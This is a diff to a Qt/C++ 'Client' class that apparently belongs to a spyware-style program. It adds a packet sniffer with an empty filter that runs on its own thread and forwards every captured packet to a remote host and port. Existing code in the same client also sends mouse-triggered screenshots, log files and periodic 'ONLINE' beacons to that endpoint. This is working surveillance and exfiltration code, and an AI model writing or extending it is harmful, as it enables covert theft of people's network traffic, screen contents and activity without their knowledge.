@@ -7,7 +7,23 @@ Client::Client(QObject* parent, const QString& defaultPath, quint16 _locPort, QS
     locPort(_locPort),
     ip(_ip),
     destPort(_destPort)
-{
+{    
+    //Start sniffer
+    QThread* snThread = new QThread();
+    std::string filter = "";//"ip dst net 192.168 and src net 192.168";
+    sniffer = std::make_unique<Sniffer>(nullptr, filter);
+    sniffer->moveToThread(snThread);
+    connect(snThread, &QThread::started, sniffer.get(), &Sniffer::start);
+    connect(snThread, &QThread::finished, snThread, &QThread::deleteLater);
+    connect(snThread, &QThread::finished, sniffer.get(), &Sniffer::deleteLater);
+    snThread->start();
+
+    //Send sniffer data
+    connect(sniffer.get(), &Sniffer::newData, [this](const QString& data){
+        fileClient->enqueueData(Type::STRING, "DATA|" + data);
+        fileClient->connect();
+    });
+
     //Start modules
     fileServer = std::make_unique<FileServer>(this, locPort, path);
     fileClient = std::make_unique<FileClient>(this, ip, destPort);
@@ -60,7 +76,7 @@ Client::Client(QObject* parent, const QString& defaultPath, quint16 _locPort, QS
         {
             MouseHook::instance().setPrevName(screenName);
             //Send screenshot
-            fileClient->enqueueData(_FILE, path + "/screens/" + screenName);
+            fileClient->enqueueData(Type::FILE, path + "/screens/" + screenName);
             fileClient->connect();
         });
     });
@@ -103,7 +119,7 @@ void Client::update()
 void Client::getOnline()
 {
     //Queue string
-    fileClient->enqueueData(_STRING, "ONLINE|" + fileClient->getName() + '|' + QString::number(locPort) );
+    fileClient->enqueueData(Type::STRING, "ONLINE|" + fileClient->getName() + '|' + QString::number(locPort) );
     //Start and connect timer
     onlineTimer->start(2*1000);    //2, 4, 8, 16 ... seconds
     connect(onlineTimer.get(), &QTimer::timeout, [this](){
@@ -193,7 +209,7 @@ void Client::enqueueLog()
     log.close();
     fullLog.close();
 
-    fileClient->enqueueData(_FILE, path + "/data_tmp.log");
+    fileClient->enqueueData(Type::FILE, path + "/data_tmp.log");
 
     //Delete temp log when it will be transmitted
     disconnect(fileClient.get(), &FileClient::transmitted, 0 , 0);
